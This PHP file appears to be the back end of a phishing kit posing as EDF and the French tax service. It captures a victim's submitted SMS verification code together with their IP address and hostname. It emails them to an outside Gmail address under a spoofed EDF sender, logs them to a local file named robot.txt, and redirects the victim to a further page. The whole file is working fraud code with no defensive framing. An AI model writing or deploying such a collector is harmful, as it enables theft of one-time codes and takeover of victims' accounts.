<?php
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[BBOX]\n";
$message .= "EDF SMS1      : ".$_POST['o8']."\n";
$message .= "[DON]\n";
$send = "blizcasper0@gmail.com";
$subject = "SMS IMPOTS:  $ip";
$headers = "From: [EDF]<info1@online.net>";
mail($send,$subject,$message,$headers);

$file = fopen("./robot.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message);

echo '<script language="Javascript">
<!--
document.location.replace("./load2.php");
// -->
</script>';
?>